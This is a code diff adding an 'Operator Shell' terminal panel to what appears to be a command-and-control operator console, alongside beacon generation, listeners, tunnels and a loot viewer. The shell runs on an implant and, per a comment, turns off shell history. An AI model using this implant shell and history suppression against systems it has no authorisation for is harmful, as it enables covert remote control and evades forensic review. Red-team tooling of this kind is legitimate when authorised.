@@ -4013,6 +4013,11 @@ _OPERATOR_HTML = r"""<!DOCTYPE html>
 <link rel="icon" type="image/png" sizes="32x32" href="/static/favicon-32.png">
 <link rel="icon" type="image/png" sizes="16x16" href="/static/favicon-16.png">
 <link rel="apple-touch-icon" href="/static/favicon-128.png">
+<!-- The vendored terminal, pinned by hash in static/VENDOR.md. Deferred,
+     because the operator shell is opened from the header and nothing on
+     first paint needs it. -->
+<link rel="stylesheet" href="/static/xterm.css">
+<script src="/static/xterm.js" defer></script>
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
 :root{
@@ -4960,6 +4965,7 @@ header .info{font-size:11px;color:var(--text2)}
     <button class="topbar-ico-btn" onclick="showBeaconGen()" title="Beacon Generator">&#128640;</button>
     <button class="topbar-ico-btn" onclick="showListeners()" title="Listeners">&#128225;</button>
     <button class="topbar-ico-btn" onclick="showTunnel()" title="Tunnel">&#128268;</button>
+    <button class="topbar-ico-btn" onclick="showOperatorShell()" title="Operator Shell">&#9646;_</button>
     <button class="topbar-ico-btn" onclick="showLootViewer()" title="Loot">&#128142;</button>
     <button class="topbar-ico-btn" onclick="showServerLog()" title="Server Log">&#128220;</button>
     <div class="bell-wrap">
@@ -8156,6 +8162,182 @@ async function drawListeners(panel){
       await drawListeners(panel);
     });
   });
+}
+
+// ── The operator shell ──
+//
+// One terminal, onto the operator's own hardware implant. The channel it
+// rides is raised and dropped with beacon tasks that only take effect at
+// the implant's next check-in, so opening and closing are both requests
+// with a delay -- and this view's whole job is to say which of the four
+// states it is in without overstating any of them.
+
+let opshellSession = null;
+let opshellTerm = null;
+let opshellTimer = null;
+let opshellAttached = false;
+
+async function showOperatorShell(){
+  // Dials nothing. The channel is raised only when the operator presses
+  // the button in the view below, which says so.
+  const overlay = document.createElement("div");
+  overlay.className = "loot-overlay";
+  overlay.onclick = e => { if(e.target===overlay) opshellTeardown(overlay); };
+  const panel = document.createElement("div");
+  panel.className = "loot-panel panel-wide";
+  overlay.appendChild(panel);
+  document.body.appendChild(overlay);
+  panel.innerHTML = '<h2>&#9646;_ Operator Shell</h2>'
+    + '<button class="loot-close" onclick="opshellTeardown('
+    + 'this.closest(\'.loot-overlay\'))">&#10005;</button>'
+    + '<div id="opshell-body" class="loot-loading">Loading...</div>';
+  await opshellPoll();
+}
+
+function opshellTeardown(overlay){
+  // The view goes away; the channel does not. Closing it is an explicit
+  // act -- and if the operator just closes the window, the claim lapses
+  // and the sweep queues the stop, which is the design's answer to a
+  // browser that stops asking.
+  if(opshellTimer){ clearTimeout(opshellTimer); opshellTimer = null; }
+  if(opshellTerm){ opshellTerm.dispose(); opshellTerm = null; }
+  opshellAttached = false;
+  if(overlay) overlay.remove();
+}
+
+async function opshellPoll(){
+  const body = document.getElementById("opshell-body");
+  if(!body){ if(opshellTimer) clearTimeout(opshellTimer); return; }
+  let state;
+  try {
+    state = await api("/api/opshell/state"
+      + (opshellSession ? "?session=" + encodeURIComponent(opshellSession) : ""));
+  } catch(e) {
+    body.innerHTML = '<p class="loot-empty">' + esc(String(e.message||e)) + '</p>';
+    return;
+  }
+  if(!opshellAttached) body.innerHTML = opshellRender(state);
+  if(state.state === "live" && opshellSession && !opshellAttached){
+    opshellAttach(state);
+  }
+  // The same cadence the agent console polls at, and it doubles as the
+  // claim's heartbeat: a view that stops asking stops holding the channel.
+  opshellTimer = setTimeout(opshellPoll, 2000);
+}
+
+function opshellRender(state){
+  const geom = (state.geometry || []).join("x");
+  const chan = state.channel === "open" ? "open"
+             : state.channel === "unknown" ? "unknown" : "closed";
+  // Its own row, not `.pcard-kv`: that class is a label/value grid, and
+  // borrowing it stacked the whole strip into one narrow column. Seen in
+  // the browser, which is the only place a layout can be seen.
+  let strip = '<div style="display:flex;gap:10px;flex-wrap:wrap;'
+    + 'align-items:center;font-size:11px;color:var(--text2);'
+    + 'margin:0 0 10px">'
+    + '<span>' + esc(state.host || state.target || "no device chosen") + '</span>'
+    + (state.user ? '<span>' + esc(state.user) + '</span>' : '')
+    + (state.root ? '<span style="color:var(--orange)">root</span>' : '')
+    + '<span>' + esc(geom) + '</span>'
+    + (state.recording ? '<span style="color:var(--red)">&#9679; recording</span>' : '')
+    + '<span>channel ' + esc(chan) + '</span>'
+    + '</div>';
+  if(state.reason){
+    strip += '<p class="loot-empty">' + esc(state.reason) + '</p>';
+  }
+  if(state.state === "live"){
+    return strip + '<div id="opshell-term"></div>'
+      + '<p class="loot-empty">exit, or Ctrl-D, ends the session. Closing it '
+      + 'queues the channel\'s shutdown, which takes effect at the next '
+      + 'check-in.</p>';
+  }
+  if(state.state === "waiting"){
+    const secs = state.expected_checkin;
+    const when = (secs === null || secs === undefined) ? "unknown"
+      : secs <= 0 ? "due now" : Math.round(secs) + "s";
+    // A number, not a spinner: a spinner invites the operator to help it
+    // along, and the wait is the price of leaving the beacon's interval
+    // alone.
+    return strip + '<p>Waiting for the next check-in: <b>' + esc(when)
+      + '</b>. The channel is raised then and this view opens by itself. '
+      + 'The beacon\'s interval is not changed.</p>';
+  }
+  if(state.state === "closing"){
+    return strip + '<p>The shutdown is queued and takes effect at the next '
+      + 'check-in. Until the agent confirms it, this says <b>closing</b> '
+      + 'and not closed.</p>';
+  }
+  const pick = (state.candidates || []).map(a =>
+    '<option value="' + esc(a) + '"' + (a === state.target ? ' selected' : '')
+    + '>' + esc(a) + '</option>').join("");
+  return strip
+    + '<label>Device <select id="opshell-agent">' + pick + '</select></label> '
+    + '<button class="fd-btn" onclick="opshellOpen()">Open a shell</button>'
+    + '<p class="loot-empty">This raises the channel on that device and '
+    + 'drops it again when the session ends. Both cost one check-in.</p>';
+}
+
+async function opshellOpen(){
+  const pick = document.getElementById("opshell-agent");
+  const agent = pick ? pick.value : null;
+  try {
+    const answer = await api("/api/opshell/open",
+      {method:"POST", body: JSON.stringify(agent ? {agent} : {})});
+    if(answer && answer.session) opshellSession = answer.session;
+  } catch(e) {
+    const body = document.getElementById("opshell-body");
+    if(body) body.innerHTML = '<p class="loot-empty">'
+      + esc(String(e.message||e)) + '</p>';
+  }
+}
+
+async function opshellAttach(state){
+  const host = document.getElementById("opshell-term");
+  if(!host || typeof Terminal === "undefined") return;
+  opshellAttached = true;
+  const cols = (state.geometry||[120,40])[0];
+  const rows = (state.geometry||[120,40])[1];
+  opshellTerm = new Terminal({cols, rows, cursorBlink:true,
+                              fontFamily:"var(--mono)", fontSize:12});
+  opshellTerm.open(host);
+  // Claims only what the code does: the session's rc files run, then
+  // `unset HISTFILE` and `set +o history` (beacon.py:3228).
+  opshellTerm.writeln("\x1b[2m-- live on " + (state.host || state.target || "?")
+    + " \u00b7 history is off in this session \u00b7 " + cols + "x" + rows
+    + ", fixed for this session --\x1b[0m");
+  opshellTerm.onData(d => {
+    api("/api/opshell/keys", {method:"POST", body: JSON.stringify(
+      {session: opshellSession, data: btoa(unescape(encodeURIComponent(d)))})})
+      .catch(() => {});
+  });
+  // fetch and a ReadableStream, not EventSource: this socket
+  // authenticates by Authorization header only and a token in a URL is
+  // forbidden by a test, so EventSource cannot be used here at all.
+  let res;
+  try {
+    res = await fetch("/api/opshell/stream?session="
+      + encodeURIComponent(opshellSession) + "&cols=" + cols + "&rows=" + rows,
+      {headers: H()});
+  } catch(e) { opshellTerm.writeln("\r\n[stream failed: " + e + "]"); return; }
+  if(!res.ok || !res.body){
+    opshellTerm.writeln("\r\n[the shell port refused this session]");
+    return;
+  }
+  const reader = res.body.getReader();
+  for(;;){
+    let step;
+    try { step = await reader.read(); } catch(e) { break; }
+    if(step.done) break;
+    opshellTerm.write(step.value);
+  }
+  opshellTerm.writeln("\r\n\x1b[2m-- session ended --\x1b[0m");
+  opshellAttached = false;
+  if(opshellSession){
+    await api("/api/opshell/close",
+      {method:"POST", body: JSON.stringify({session: opshellSession})})
+      .catch(() => {});
+    opshellSession = null;
+  }
 }
 
 async function showTunnel(){
